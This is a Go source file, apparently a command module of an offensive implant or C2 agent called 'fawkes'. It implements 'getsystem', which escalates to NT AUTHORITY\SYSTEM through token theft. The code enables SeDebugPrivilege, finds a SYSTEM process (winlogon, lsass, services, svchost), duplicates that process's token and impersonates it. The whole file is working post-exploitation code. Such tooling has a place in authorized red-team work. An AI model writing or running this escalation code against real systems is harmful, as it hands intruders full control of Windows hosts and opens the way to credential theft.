//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// Windows API procedures for named pipe impersonation
var (
	procCreateNamedPipeW           = kernel32.NewProc("CreateNamedPipeW")
	procConnectNamedPipe           = kernel32.NewProc("ConnectNamedPipe")
	procDisconnectNamedPipe        = kernel32.NewProc("DisconnectNamedPipe")
	procImpersonateNamedPipeClient = kernel32.NewProc("ImpersonateNamedPipeClient")
)

// Named pipe constants
const (
	PIPE_ACCESS_DUPLEX       = 0x00000003
	PIPE_TYPE_BYTE           = 0x00000000
	PIPE_READMODE_BYTE       = 0x00000000
	PIPE_WAIT                = 0x00000000
	PIPE_UNLIMITED_INSTANCES = 255
)

type GetSystemCommand struct{}

func (c *GetSystemCommand) Name() string {
	return "getsystem"
}

func (c *GetSystemCommand) Description() string {
	return "Elevate to SYSTEM via token stealing from a SYSTEM process (requires SeDebugPrivilege)"
}

type getSystemArgs struct {
	Technique string `json:"technique"`
}

func (c *GetSystemCommand) Execute(task structs.Task) structs.CommandResult {
	var args getSystemArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	// Default to token stealing
	if args.Technique == "" {
		args.Technique = "steal"
	}

	// Get current identity before escalation
	oldIdentity, _ := GetCurrentIdentity()

	switch strings.ToLower(args.Technique) {
	case "steal":
		return getSystemViaSteal(oldIdentity)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown technique: %s. Available: steal", args.Technique),
			Status:    "error",
			Completed: true,
		}
	}
}

// getSystemViaSteal finds a SYSTEM process and steals its token using
// OpenProcess + OpenProcessToken + DuplicateTokenEx + ImpersonateLoggedOnUser.
// Requires SeDebugPrivilege (available on elevated admin processes).
func getSystemViaSteal(oldIdentity string) structs.CommandResult {
	// Enable SeDebugPrivilege to access SYSTEM processes
	if err := enableDebugPrivilege(); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to enable SeDebugPrivilege: %v (need admin privileges)", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Find a SYSTEM process to steal from
	// Try well-known SYSTEM processes in order of preference:
	// 1. winlogon.exe — always SYSTEM, one per session
	// 2. lsass.exe — always SYSTEM, critical process
	// 3. services.exe — always SYSTEM
	// 4. Any process running as SYSTEM
	systemPID, processName, err := findSystemProcess()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to find a SYSTEM process: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Revert any existing impersonation first
	RevertCurrentToken()

	// Open target process
	hProcess, err := windows.OpenProcess(PROCESS_QUERY_INFORMATION, false, systemPID)
	if err != nil {
		// Try with limited information access
		hProcess, err = windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, systemPID)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("OpenProcess failed for PID %d (%s): %v", systemPID, processName, err),
				Status:    "error",
				Completed: true,
			}
		}
	}
	defer windows.CloseHandle(hProcess)

	// Open process token
	var hToken windows.Token
	err = windows.OpenProcessToken(hProcess, windows.TOKEN_ALL_ACCESS, &hToken)
	if err != nil {
		// Fall back to specific rights
		err = windows.OpenProcessToken(hProcess, STEAL_TOKEN_ACCESS, &hToken)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("OpenProcessToken failed for PID %d (%s): %v", systemPID, processName, err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	// Duplicate the token
	var duplicatedToken windows.Token
	err = windows.DuplicateTokenEx(
		hToken,
		windows.MAXIMUM_ALLOWED,
		nil,
		windows.SecurityDelegation,
		windows.TokenPrimary,
		&duplicatedToken,
	)
	if err != nil {
		// Try with SecurityImpersonation
		err = windows.DuplicateTokenEx(
			hToken,
			windows.MAXIMUM_ALLOWED,
			nil,
			windows.SecurityImpersonation,
			windows.TokenImpersonation,
			&duplicatedToken,
		)
		if err != nil {
			hToken.Close()
			return structs.CommandResult{
				Output:    fmt.Sprintf("DuplicateTokenEx failed: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}
	hToken.Close()

	// Store the SYSTEM token using existing infrastructure
	if err := SetIdentityToken(duplicatedToken); err != nil {
		windows.CloseHandle(windows.Handle(duplicatedToken))
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to impersonate SYSTEM token: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Verify
	newIdentity, err := GetCurrentIdentity()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Token stolen but failed to verify identity: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	var sb strings.Builder
	sb.WriteString("Successfully elevated to SYSTEM\n")
	sb.WriteString(fmt.Sprintf("Technique: Token steal from %s (PID %d)\n", processName, systemPID))
	if oldIdentity != "" {
		sb.WriteString(fmt.Sprintf("Old: %s\n", oldIdentity))
	}
	sb.WriteString(fmt.Sprintf("New: %s\n", newIdentity))
	sb.WriteString("Use rev2self to revert to original context")

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// findSystemProcess enumerates processes and finds one running as NT AUTHORITY\SYSTEM.
// Tries well-known SYSTEM processes first, then falls back to scanning all processes.
func findSystemProcess() (uint32, string, error) {
	// Take a snapshot of all processes
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, "", fmt.Errorf("CreateToolhelp32Snapshot: %v", err)
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	// Preferred SYSTEM processes (in order of preference)
	preferred := []string{"winlogon.exe", "lsass.exe", "services.exe", "svchost.exe"}
	preferredMap := make(map[string]bool)
	for _, p := range preferred {
		preferredMap[p] = true
	}

	type processInfo struct {
		pid  uint32
		name string
	}
	var preferredProcesses []processInfo
	var otherProcesses []processInfo

	err = windows.Process32First(snapshot, &entry)
	if err != nil {
		return 0, "", fmt.Errorf("Process32First: %v", err)
	}

	for {
		name := windows.UTF16ToString(entry.ExeFile[:])
		pid := entry.ProcessID

		if pid > 4 { // Skip System (4) and Idle (0)
			if isSystemProcess(pid) {
				if preferredMap[strings.ToLower(name)] {
					preferredProcesses = append(preferredProcesses, processInfo{pid, name})
				} else {
					otherProcesses = append(otherProcesses, processInfo{pid, name})
				}
			}
		}

		err = windows.Process32Next(snapshot, &entry)
		if err != nil {
			break
		}
	}

	// Return preferred processes first (winlogon > lsass > services > svchost)
	for _, pref := range preferred {
		for _, p := range preferredProcesses {
			if strings.EqualFold(p.name, pref) {
				return p.pid, p.name, nil
			}
		}
	}

	// Fall back to any SYSTEM process
	if len(otherProcesses) > 0 {
		return otherProcesses[0].pid, otherProcesses[0].name, nil
	}

	return 0, "", fmt.Errorf("no SYSTEM process found (are you running as admin?)")
}

// isSystemProcess checks if a process is running as NT AUTHORITY\SYSTEM
func isSystemProcess(pid uint32) bool {
	hProcess, err := windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return false
	}
	defer windows.CloseHandle(hProcess)

	var token windows.Token
	err = windows.OpenProcessToken(hProcess, TOKEN_QUERY, &token)
	if err != nil {
		return false
	}
	defer token.Close()

	tokenUser, err := token.GetTokenUser()
	if err != nil {
		return false
	}

	// Check if the SID is NT AUTHORITY\SYSTEM (S-1-5-18)
	systemSID, err := windows.StringToSid("S-1-5-18")
	if err != nil {
		return false
	}

	return tokenUser.User.Sid.Equals(systemSID)
}

// enableDebugPrivilege enables SeDebugPrivilege on the current process token
func enableDebugPrivilege() error {
	var token windows.Token
	processHandle, err := windows.GetCurrentProcess()
	if err != nil {
		return err
	}

	err = windows.OpenProcessToken(processHandle, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return err
	}
	defer token.Close()

	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeDebugPrivilege"), &luid)
	if err != nil {
		return err
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{
				Luid:       luid,
				Attributes: windows.SE_PRIVILEGE_ENABLED,
			},
		},
	}

	err = windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
	if err != nil {
		return err
	}

	return nil
}
